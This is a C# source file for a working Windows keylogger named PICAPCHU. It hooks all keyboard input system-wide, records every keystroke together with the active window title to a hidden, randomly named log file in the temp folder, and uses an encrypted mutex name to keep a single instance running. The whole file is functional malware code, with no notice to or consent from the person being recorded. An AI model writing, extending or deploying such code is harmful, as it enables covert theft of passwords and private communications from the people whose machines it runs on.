using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace PICAPCHU
{
    public static class PICAPCHU
    {
        public static void Main()
        {
            CreateMutex(aes.DecryptFromBase64String(mutexName));
            _hookID = SetHook(_proc);
            Application.Run();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]";
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;
                    }
                }

                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                {
                    title = p.ProcessName;
                }
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "???";
            }
        }

        private static bool CreateMutex(String mute)
        {
            bool isMuteCreated = false;
            System.Threading.Mutex MUT;
            try
            {
                MUT = System.Threading.Mutex.OpenExisting(mute);
                Environment.Exit(0);
            }
            catch
            {
                new System.Threading.Mutex(false, mute, out isMuteCreated);
            }
            return isMuteCreated;
        }
        static string GetRandomString(int lenOfTheNewStr)
        {
            string output = string.Empty;
            while (true)
            {
                output = output + Path.GetRandomFileName().Replace(".", string.Empty);
                if (output.Length > lenOfTheNewStr)
                {
                    output = output.Substring(0, lenOfTheNewStr);
                    break;
                }
            }
            return output;
        }

        private static string KEY = "38RM7FoKvdGmFHvc6QtQfA==";
        private static string IV = "sN5DMQO9DMCnJ8P6C1DCTQ==";
        private static string mutexName = "wvCzE/OR3Ua6k9gIIAp4y4ZsWRSDJV7Lb0ugRsR7S38MNBRWlIhj7lMV6P0gAnjyP3nsLMz0XfOFI7KppWa/yg==";


        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly string loggerPath = Path.GetTempPath() + GetRandomString(10) + ".log";
        private static readonly Aes aes = new Aes(KEY, IV);
        private static string CurrentActiveWindowTitle;


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

    }
    class Aes
    {
        private static RijndaelManaged rijndael = new RijndaelManaged();
        private static UnicodeEncoding unicodeEncoding = new UnicodeEncoding();

        private void InitializeRijndael()
        {
            rijndael.Mode = CipherMode.CBC;
            rijndael.Padding = PaddingMode.PKCS7;
        }

        public Aes(String base64key, String base64iv)
        {
            InitializeRijndael();

            rijndael.Key = Convert.FromBase64String(base64key);
            rijndael.IV = Convert.FromBase64String(base64iv);
        }

        public string Decrypt(byte[] cipher)
        {
            ICryptoTransform transform = rijndael.CreateDecryptor();
            byte[] decryptedValue = transform.TransformFinalBlock(cipher, 0, cipher.Length);
            return unicodeEncoding.GetString(decryptedValue);
        }

        public string DecryptFromBase64String(string base64cipher)
        {
            return Decrypt(Convert.FromBase64String(base64cipher));
        }

    }
}
